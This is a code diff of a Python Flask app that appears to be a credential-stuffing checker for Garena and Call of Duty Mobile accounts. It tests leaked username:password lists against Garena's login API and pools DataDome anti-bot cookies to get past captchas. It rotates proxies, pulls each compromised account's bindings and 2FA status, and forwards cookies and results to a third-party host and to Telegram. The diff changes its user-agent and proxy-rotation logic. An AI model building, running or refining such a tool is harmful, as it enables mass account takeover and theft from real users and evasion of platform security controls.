@@ -1,5 +1,9 @@
 #--- START OF FILE app.py ---
 
+# --- START OF FILE app.py ---
+
+# --- START OF MERGED V1.py ---
+
 import os
 import sys
 import re
@@ -100,15 +104,6 @@ COUNTRY_KEYWORD_MAP = {
     "TW": ["TAIWAN", "TW"], "TH": ["THAILAND", "TH"], "RU": ["RUSSIA", "RUSSIAN FEDERATION", "RU"],
     "PT": ["PORTUGAL", "PT"],
 }
-
-# ACCURACY-MOD: Add a list of User-Agents to rotate
-USER_AGENTS = [
-    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 11; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/113.0.5672.109 Mobile/15E148 Safari/604.1"
-]
 
 PROXY_SOURCES = {
     'http': list(set([
@@ -278,6 +273,7 @@ def getpass(password, v1, v2):
     decryption_key = generate_decryption_key(password_md5, v1, v2)
     return encrypt_aes_256_ecb(password_md5, decryption_key)
 
+# PROXY-MOD: Function refactored to accept a requests.Session object
 def get_datadome_cookie(s, user_session):
     url = 'https://dd.garena.com/js/'
     headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br, zstd','accept-language': 'en-US,en;q=0.9','cache-control': 'no-cache','content-type': 'application/x-www-form-urlencoded','origin': 'https://account.garena.com','pragma': 'no-cache','referer': 'https://account.garena.com/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'}
@@ -295,6 +291,7 @@ def get_datadome_cookie(s, user_session):
         return None
     except requests.exceptions.RequestException: return None
 
+# PROXY-MOD: Function refactored to accept a requests.Session object
 def fetch_new_datadome_pool(s, user_session, num_cookies=5):
     log_message(user_session, f"[⚙️] Attempting to fetch {num_cookies} new DataDome cookies...", "text-info")
     new_pool = []
@@ -328,12 +325,13 @@ def save_datadome_cookie(user_session, cookie_value):
         save_data(cookie_pool, file_path)
         log_message(user_session, "[💾] New DataDome Cookie saved to pool.", "text-info")
 
+# PROXY-MOD: Function refactored to accept a requests.Session object
 def check_login(s, user_session, account_username, _id, encryptedpassword, password, selected_header, cookies, dataa, date, selected_cookie_module):
     cookies["datadome"] = dataa
     login_params = {'app_id': '100082', 'account': account_username, 'password': encryptedpassword, 'redirect_uri': redrov, 'format': 'json', 'id': _id}
     login_url = apkrov + urlencode(login_params)
     try:
-        response = s.get(login_url, headers=selected_header, cookies=cookies, timeout=75) # ACCURACY-MOD: Increased timeout
+        response = s.get(login_url, headers=selected_header, cookies=cookies, timeout=60)
         response.raise_for_status()
         login_json_response = response.json()
     except requests.exceptions.RequestException as e: return f"[⚠️] Request Error: {e}"
@@ -354,29 +352,14 @@ def check_login(s, user_session, account_username, _id, encryptedpassword, passw
     init_url = 'http://gakumakupal.x10.bz/patal.php'
     params = {f'coke_{k}': v for k, v in coke.items()}
     params.update({f'hider_{k}': v for k, v in hider.items()})
-    
-    # ACCURACY-MOD: Add retry logic for the external bind check service
-    bind_check_response = None
-    for attempt in range(3):
-        try:
-            init_response = s.get(init_url, params=params, timeout=120)
-            init_response.raise_for_status()
-            bind_check_response = init_response.json()
-            if 'error' not in bind_check_response:
-                break # Success, exit loop
-        except (requests.RequestException, json.JSONDecodeError) as e:
-            if attempt < 2:
-                log_message(user_session, f"[⚠️] Bind check failed (attempt {attempt+1}/3), retrying...", "text-warning")
-                time.sleep(3)
-                continue
-            else:
-                return f"[ERROR] Bind check failed after 3 attempts: {e}"
-
-    if not bind_check_response or 'error' in bind_check_response or not bind_check_response.get('success', True): 
-        return f"[ERROR] {bind_check_response.get('error', 'Unknown error during bind check') if bind_check_response else 'No response from bind check'}"
-
-    bindings = bind_check_response.get('bindings', [])
-    is_clean = bind_check_response.get('status') == "\033[0;32m\033[1mClean\033[0m"
+    try:
+        init_response = s.get(init_url, params=params, timeout=120)
+        init_response.raise_for_status()
+        init_json_response = init_response.json()
+    except (requests.RequestException, json.JSONDecodeError) as e: return f"[ERROR] Bind check failed: {e}"
+    if 'error' in init_json_response or not init_json_response.get('success', True): return f"[ERROR] {init_json_response.get('error', 'Unknown error during bind check')}"
+    bindings = init_json_response.get('bindings', [])
+    is_clean = init_json_response.get('status') == "\033[0;32m\033[1mClean\033[0m"
     country, last_login, fb, mobile, facebook = "N/A", "N/A", "N/A", "N/A", "False"
     shell, email, email_verified, authenticator_enabled, two_step_enabled = "0", "N/A", "False", "False", "False"
     for item in bindings:
@@ -414,20 +397,21 @@ def check_login(s, user_session, account_username, _id, encryptedpassword, passw
         else: return f"[FAILED] 'access_token' not found in grant response."
     except (requests.RequestException, json.JSONDecodeError) as e: return f"[FAILED] Token grant failed: {e}"
 
+# PROXY-MOD: Function refactored to accept a requests.Session object
 def show_level(s, user_session, access_token, selected_header, sso, token, newdate, cookie):
     url = "https://auth.codm.garena.com/auth/auth/callback_n"
     params = {"site": "https://api-delete-request.codm.garena.co.id/oauth/callback/", "access_token": access_token}
     headers = {"Referer": "https://auth.garena.com/", "User-Agent": selected_header.get("User-Agent", "Mozilla/5.0")}
     cookie.update({"datadome": newdate, "sso_key": sso, "token_session": token})
     try:
-        res = s.get(url, headers=headers, cookies=cookie, params=params, timeout=45, allow_redirects=True) # ACCURACY-MOD: Increased timeout
+        res = s.get(url, headers=headers, cookies=cookie, params=params, timeout=30, allow_redirects=True)
         res.raise_for_status()
         parsed_url = urlparse(res.url)
         extracted_token = parse_qs(parsed_url.query).get("token", [None])[0]
         if not extracted_token: return "[FAILED] No token extracted from redirected URL."
         check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
         check_login_headers = {"codm-delete-token": extracted_token, "Origin": "https://delete-request.codm.garena.co.id", "Referer": "https://delete-request.codm.garena.co.id/", "User-Agent": selected_header.get("User-Agent", "Mozilla/5.0")}
-        check_login_response = s.get(check_login_url, headers=check_login_headers, timeout=45) # ACCURACY-MOD: Increased timeout
+        check_login_response = s.get(check_login_url, headers=check_login_headers, timeout=30)
         check_login_response.raise_for_status()
         data = check_login_response.json()
         if data and "user" in data:
@@ -512,33 +496,38 @@ def format_result(last_login, country, shell, mobile, facebook, email_verified, 
 
 def get_request_data(selected_cookie_module):
     cookies = selected_cookie_module.get_cookies()
-    # ACCURACY-MOD: Rotate User-Agent
-    headers = {'Host': 'auth.garena.com', 'Connection': 'keep-alive', 'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"', 'sec-ch-ua-mobile': '?1', 'User-Agent': random.choice(USER_AGENTS), 'sec-ch-ua-platform': '"Android"', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-US,en;q=0.9'}
+    headers = {'Host': 'auth.garena.com', 'Connection': 'keep-alive', 'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36', 'sec-ch-ua-platform': '"Android"', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-US,en;q=0.9'}
     return cookies, headers
 
+# PROXY-MOD: Function refactored to accept a requests.Session object
 def check_account(s, user_session, username, password, date, datadome_cookie, selected_cookie_module):
-    # This function is now just a wrapper. The main retry logic is in run_check_task to handle proxy rotation.
-    try:
-        random_id = "17290585" + str(random.randint(10000, 99999))
-        cookies, headers = get_request_data(selected_cookie_module)
-        if datadome_cookie: cookies['datadome'] = datadome_cookie
-        params, login_url = {"app_id": "100082", "account": username, "format": "json", "id": random_id}, "https://auth.garena.com/api/prelogin"
-        response = s.get(login_url, params=params, cookies=cookies, headers=headers, timeout=30) # ACCURACY-MOD: Increased timeout
-        if "captcha" in response.text.lower(): return "[CAPTCHA]"
-        if response.status_code == 200:
-            data = response.json()
-            if not all(k in data for k in ['v1', 'v2', 'id']): return "[😢] 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗗𝗜𝗗𝗡'𝗧 𝗘𝗫𝗜𝗦𝗧"
-            login_datadome = response.cookies.get('datadome') or datadome_cookie
-            if "error" in data: return f"[FAILED] Pre-login error: {data['error']}"
-            encrypted_password = getpass(password, data['v1'], data['v2'])
-            return check_login(s, user_session, username, random_id, encrypted_password, password, headers, cookies, login_datadome, date, selected_cookie_module)
-        else: return f"[FAILED] HTTP Status: {response.status_code}"
-    except requests.exceptions.RequestException as e:
-        error_str = str(e).lower()
-        if "proxy" in error_str or "connection" in error_str or "timeout" in error_str:
-            return f"[PROXY/NET ERROR] {e}" # Specific tag for proxy/network errors for the retry logic
-        else: return f"[FAILED] Unexpected Request Error: {e}"
-    except Exception as e: return f"[FAILED] Unexpected Error: {e}"
+    max_retries = 3
+    for attempt in range(max_retries):
+        try:
+            random_id = "17290585" + str(random.randint(10000, 99999))
+            cookies, headers = get_request_data(selected_cookie_module)
+            if datadome_cookie: cookies['datadome'] = datadome_cookie
+            params, login_url = {"app_id": "100082", "account": username, "format": "json", "id": random_id}, "https://auth.garena.com/api/prelogin"
+            response = s.get(login_url, params=params, cookies=cookies, headers=headers, timeout=20)
+            if "captcha" in response.text.lower(): return "[CAPTCHA]"
+            if response.status_code == 200:
+                data = response.json()
+                if not all(k in data for k in ['v1', 'v2', 'id']): return "[😢] 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗗𝗜𝗗𝗡'𝗧 𝗘𝗫𝗜𝗦𝗧"
+                login_datadome = response.cookies.get('datadome') or datadome_cookie
+                if "error" in data: return f"[FAILED] Pre-login error: {data['error']}"
+                encrypted_password = getpass(password, data['v1'], data['v2'])
+                return check_login(s, user_session, username, random_id, encrypted_password, password, headers, cookies, login_datadome, date, selected_cookie_module)
+            else: return f"[FAILED] HTTP Status: {response.status_code}"
+        except requests.exceptions.RequestException as e:
+            error_str = str(e).lower()
+            if "proxy" in error_str:
+                return f"[FAILED] Proxy Error: {e}"
+            if "failed to establish a new connection" in error_str or "max retries exceeded" in error_str or "network is unreachable" in error_str:
+                log_message(user_session, f"[⚠️] Connection error for {username}. Retrying ({attempt + 1}/{max_retries})...", "text-warning")
+                if attempt < max_retries - 1: time.sleep(5); continue
+                else: return f"[FAILED] Connection failed after {max_retries} retries."
+            else: return f"[FAILED] Unexpected Request Error: {e}"
+        except Exception as e: return f"[FAILED] Unexpected Error: {e}"
 
 def send_to_telegram(bot_token, chat_id, message):
     api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
@@ -585,6 +574,7 @@ def clear_progress(username):
     progress_file = PROGRESS_STATE_FILE_TEMPLATE.format(hashlib.md5(username.encode()).hexdigest())
     if os.path.exists(progress_file): os.remove(progress_file)
 
+# PROXY-MOD: Function signature updated to accept proxy_selection
 def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_cookie_module_name, use_cookie_set, auto_delete, force_restart, telegram_level_filter, fixed_cookie_number, proxy_selection, user_info, user_session):
     log_message(user_session, "[⚠️ VERCEL NOTE] Checker is running on a serverless platform. Task will be terminated after the timeout limit.", "text-warning")
     status_lock = user_session['status_lock']
@@ -594,25 +584,27 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
     username = user_info['username']
     is_complete = False
 
-    # ACCURACY-MOD: Setup proxy pool for rotation
-    good_proxies = []
+    # PROXY-MOD: Setup requests session with selected proxy
+    s = requests.Session()
+    proxy_to_use = None
     if proxy_selection and proxy_selection != 'none':
-        all_proxies_data = load_data(PROXIES_FILE)
-        good_proxies_data = [p for p in all_proxies_data if p.get('status') == 'good']
+        all_proxies = load_data(PROXIES_FILE)
         if proxy_selection == 'random':
-            if good_proxies_data:
-                good_proxies = good_proxies_data
-                random.shuffle(good_proxies) # Shuffle for randomness
-                log_message(user_session, f"[🌐] Loaded {len(good_proxies)} good proxies for rotation.", "text-info")
+            good_proxies = [p for p in all_proxies if p.get('status') == 'good']
+            if good_proxies:
+                proxy_to_use = random.choice(good_proxies)
             else:
-                log_message(user_session, "[⚠️] Random proxy selected, but no 'good' proxies available. Continuing without proxy.", "text-warning")
-        else: # Specific proxy selected
-            proxy_to_use = next((p for p in all_proxies_data if p.get('proxy') == proxy_selection), None)
-            if proxy_to_use:
-                good_proxies = [proxy_to_use]
-                log_message(user_session, f"[🌐] Using specific proxy: {proxy_selection}", "text-info")
-            else:
+                log_message(user_session, "[⚠️] Random proxy selected, but no 'good' proxies are available. Continuing without proxy.", "text-warning")
+        else: # Specific proxy selected by ip:port string
+            proxy_to_use = next((p for p in all_proxies if p.get('proxy') == proxy_selection), None)
+            if not proxy_to_use:
                 log_message(user_session, f"[⚠️] Selected proxy {proxy_selection} not found. Continuing without proxy.", "text-warning")
+
+        if proxy_to_use:
+            protocol = proxy_to_use['protocol']
+            proxy_url = f"{protocol}://{proxy_to_use['proxy']}"
+            s.proxies = {'http': proxy_url, 'https': proxy_url}
+            log_message(user_session, f"[🌐] Using {protocol.upper()} proxy: {proxy_to_use['proxy']}", "text-info")
 
     try:
         if force_restart:
@@ -645,93 +637,53 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
                 loaded_cookies = load_data(cookie_file)
                 if isinstance(loaded_cookies, list): cookie_state['pool'] = [c.get('datadome') for c in loaded_cookies if 'datadome' in c]
                 log_message(user_session, f"[🍪] Loaded {len(cookie_state['pool'])} DataDome cookies from local pool.", "text-info")
-
-        proxy_state = {'pool': good_proxies, 'index': -1}
-
+        if not cookie_state['pool']:
+            log_message(user_session, "[⚠️] DataDome cookie pool is empty. Fetching new ones...", "text-warning")
+            cookie_state['pool'] = fetch_new_datadome_pool(s, user_session)
+            if not cookie_state['pool']:
+                log_message(user_session, "[❌] Failed to get any DataDome cookies. Stopping.", "text-danger")
+                stop_event.set()
         for loop_idx, acc in enumerate(accounts_to_process):
             original_index = start_from_index + loop_idx
             if stop_event.is_set(): log_message(user_session, "Checker stopped by user.", "text-warning"); break
             with status_lock: check_status.update({'progress': original_index, 'current_account': acc})
             if ':' in acc:
                 username_acc, password = acc.split(':', 1)
-                
-                # ACCURACY-MOD: Main retry loop for proxy rotation
-                max_proxy_retries = min(len(proxy_state['pool']), 3) if proxy_state['pool'] else 1
-                final_result = None
-
-                for proxy_attempt in range(max_proxy_retries):
-                    if stop_event.is_set(): break
-                    s = requests.Session()
-                    
-                    if proxy_state['pool']:
-                        proxy_state['index'] = (proxy_state['index'] + 1) % len(proxy_state['pool'])
-                        proxy_to_use = proxy_state['pool'][proxy_state['index']]
-                        protocol = proxy_to_use['protocol']
-                        proxy_url = f"{protocol}://{proxy_to_use['proxy']}"
-                        s.proxies = {'http': proxy_url, 'https': proxy_url}
-                        if proxy_attempt > 0:
-                             log_message(user_session, f"[🔄] Retrying {username_acc} with new proxy: ...{proxy_to_use['proxy'][-10:]} ({proxy_attempt+1}/{max_proxy_retries})", "text-info")
-
-                    is_captcha_loop = True
-                    while is_captcha_loop and not stop_event.is_set():
-                        # ACCURACY-MOD: Self-healing cookie pool
-                        if not cookie_state['pool']:
-                            log_message(user_session, "[⚠️] DataDome cookie pool is empty. Fetching new ones...", "text-warning")
-                            # Use a temporary session without proxy to fetch new cookies
-                            temp_s = requests.Session()
-                            new_cookies = fetch_new_datadome_pool(temp_s, user_session)
-                            if not new_cookies:
-                                log_message(user_session, "[❌] Failed to get any DataDome cookies. Stopping.", "text-danger")
-                                stop_event.set(); break
-                            cookie_state['pool'].extend(new_cookies)
-
-                        current_datadome = None
-                        for _ in range(len(cookie_state['pool'])):
-                            cookie_state['index'] = (cookie_state['index'] + 1) % len(cookie_state['pool'])
-                            potential_cookie = cookie_state['pool'][cookie_state['index']]
-                            cooldown_until = cookie_state['cooldown'].get(potential_cookie)
-                            if cooldown_until and time.time() < cooldown_until: continue
-                            current_datadome = potential_cookie; break
-                        
-                        if not current_datadome:
-                            log_message(user_session, "[❌] All available cookies are on cooldown. Please wait or add new cookies.", "text-danger")
-                            stop_event.set(); break
-                        
-                        proxy_info = f" with proxy ...{proxy_state['pool'][proxy_state['index']]['proxy'][-10:]}" if proxy_state['pool'] else ""
-                        log_message(user_session, f"[▶] Checking: {username_acc}:{password} with cookie ...{current_datadome[-6:]}{proxy_info}", "text-info")
-                        
-                        result = check_account(s, user_session, username_acc, password, datenok, current_datadome, selected_cookie_module)
-                        
-                        if result == "[CAPTCHA]":
-                            stats['captcha_count'] += 1
-                            log_message(user_session, f"[🔴 CAPTCHA] Triggered by cookie ...{current_datadome[-6:]}", "text-danger")
-                            expiry_time = time.time() + 300
-                            cookie_state['cooldown'][current_datadome] = expiry_time
-                            log_message(user_session, f"[⏳] Cookie placed on cooldown for 5 minutes.", "text-warning")
-                            with status_lock: check_status['captcha_detected'] = True
-                            time.sleep(random.uniform(2, 4))
-                            captcha_pause_event.clear()
-                            captcha_pause_event.wait(timeout=30)
-                            with status_lock: check_status['captcha_detected'] = False
-                            if stop_event.is_set(): break
-                            log_message(user_session, "[🔄] Resuming check for the same account...", "text-info")
-                            continue
-                        else:
-                            is_captcha_loop = False
-                            final_result = result
-                    
-                    if stop_event.is_set(): break
-
-                    # ACCURACY-MOD: Check if we should retry with a new proxy
-                    is_proxy_error = isinstance(final_result, str) and "[PROXY/NET ERROR]" in final_result
-                    if not is_proxy_error:
-                        break # Break proxy retry loop if it's not a proxy error (e.g., success, wrong pass, etc.)
-                
+                is_captcha_loop = True
+                while is_captcha_loop and not stop_event.is_set():
+                    current_datadome = None
+                    if not cookie_state['pool']:
+                        log_message(user_session, "[❌] No cookies available in the pool. Stopping check.", "text-danger")
+                        stop_event.set(); break
+                    for _ in range(len(cookie_state['pool'])):
+                        cookie_state['index'] = (cookie_state['index'] + 1) % len(cookie_state['pool'])
+                        potential_cookie = cookie_state['pool'][cookie_state['index']]
+                        cooldown_until = cookie_state['cooldown'].get(potential_cookie)
+                        if cooldown_until and time.time() < cooldown_until: continue
+                        current_datadome = potential_cookie; break
+                    if not current_datadome:
+                        log_message(user_session, "[❌] All available cookies are on cooldown. Please wait or add new cookies.", "text-danger")
+                        stop_event.set(); break
+                    log_message(user_session, f"[▶] Checking: {username_acc}:{password} with cookie ...{current_datadome[-6:]}", "text-info")
+                    result = check_account(s, user_session, username_acc, password, datenok, current_datadome, selected_cookie_module)
+                    if result == "[CAPTCHA]":
+                        stats['captcha_count'] += 1
+                        log_message(user_session, f"[🔴 CAPTCHA] Triggered by cookie ...{current_datadome[-6:]}", "text-danger")
+                        expiry_time = time.time() + 300
+                        cookie_state['cooldown'][current_datadome] = expiry_time
+                        log_message(user_session, f"[⏳] Cookie placed on cooldown for 5 minutes.", "text-warning")
+                        with status_lock: check_status['captcha_detected'] = True
+                        time.sleep(random.uniform(2, 4))
+                        captcha_pause_event.clear()
+                        captcha_pause_event.wait(timeout=30)
+                        with status_lock: check_status['captcha_detected'] = False
+                        if stop_event.is_set(): break
+                        log_message(user_session, "[🔄] Resuming check for the same account...", "text-info")
+                        continue
+                    else: is_captcha_loop = False
                 if stop_event.is_set(): break
-
-                # Process the final result after all retries
-                if isinstance(final_result, tuple):
-                    console_message, telegram_message, codm_level_num, _, user_res, _, _, _, is_clean, file_to_write, content_to_write = final_result
+                if isinstance(result, tuple):
+                    console_message, telegram_message, codm_level_num, _, user_res, _, _, _, is_clean, file_to_write, content_to_write = result
                     log_message(user_session, console_message, "text-success")
                     stats['successful'] += 1; stats['clean' if is_clean else 'not_clean'] += 1
                     os.makedirs(os.path.dirname(file_to_write), exist_ok=True)
@@ -742,19 +694,16 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
                             if send_to_telegram(telegram_bot_token, telegram_chat_id, telegram_message):
                                 log_message(user_session, f"[✅ TG] Notification sent for {user_res}.", "text-info"); stats['telegram_sent'] += 1
                             else: log_message(user_session, f"[❌ TG] Failed to send notification for {user_res}.", "text-danger")
-                elif final_result:
+                elif result:
                     stats['failed'] += 1
-                    if "[🔐]" in final_result: stats['incorrect_pass'] += 1
-                    elif "[😢]" in final_result: stats['no_exist'] += 1
+                    if "[🔐]" in result: stats['incorrect_pass'] += 1
+                    elif "[😢]" in result: stats['no_exist'] += 1
                     else: stats['other_fail'] += 1
-                    with open(failed_file, 'a', encoding='utf-8') as failed_out: failed_out.write(f"{username_acc}:{password} - {final_result}\n")
-                    log_message(user_session, f"User: {username_acc} | Pass: {password} ➔ {final_result}", "text-danger")
-            else:
-                log_message(user_session, f"Invalid format: {acc} ➔ Skipping", "text-warning")
-            
+                    with open(failed_file, 'a', encoding='utf-8') as failed_out: failed_out.write(f"{username_acc}:{password} - {result}\n")
+                    log_message(user_session, f"User: {username_acc} | Pass: {password} ➔ {result}", "text-danger")
+            else: log_message(user_session, f"Invalid format: {acc} ➔ Skipping", "text-warning")
             with status_lock: check_status['stats'] = stats.copy()
             save_progress(username, file_path, original_index)
-        
         if not stop_event.is_set():
             is_complete = True
             with status_lock:
@@ -774,7 +723,6 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
                     log_message(user_session, f"Source file '{os.path.basename(file_path)}' has been deleted from temporary storage.", "text-info")
                 except OSError as e: log_message(user_session, f"Failed to delete source file: {e}", "text-danger")
         with status_lock: check_status['running'] = False
-
 
 # --- Flask Routes ---
 
@@ -875,9 +823,9 @@ def start_check():
     auto_delete = 'auto_delete' in request.form
     force_restart = 'force_restart' in request.form
     telegram_level_filter = request.form.get('telegram_level_filter', 'none')
-    proxy_selection = request.form.get('proxy_selection', 'none')
+    proxy_selection = request.form.get('proxy_selection', 'none') # PROXY-MOD
     log_message(user_session, "Starting new check...", "text-info")
-    thread = threading.Thread(target=run_check_task, args=( file_path, bot_token, chat_id, cookie_module, use_cookie_set, auto_delete, force_restart, telegram_level_filter, cookie_number, proxy_selection, session['user'], user_session ))
+    thread = threading.Thread(target=run_check_task, args=( file_path, bot_token, chat_id, cookie_module, use_cookie_set, auto_delete, force_restart, telegram_level_filter, cookie_number, proxy_selection, session['user'], user_session )) # PROXY-MOD
     thread.daemon = True; thread.start()
     user_session['thread'] = thread
     return redirect(url_for('index'))
@@ -914,6 +862,7 @@ def captcha_action():
     action = request.form.get('action')
     log_message(user_session, f"Captcha action received: {action}", "text-info")
     if action == 'fetch_pool':
+        # PROXY-MOD: Use a temporary session for fetching cookies if checker is running with proxy
         s = requests.Session()
         user_session = get_or_create_user_session(username)
         if user_session['status']['running']:
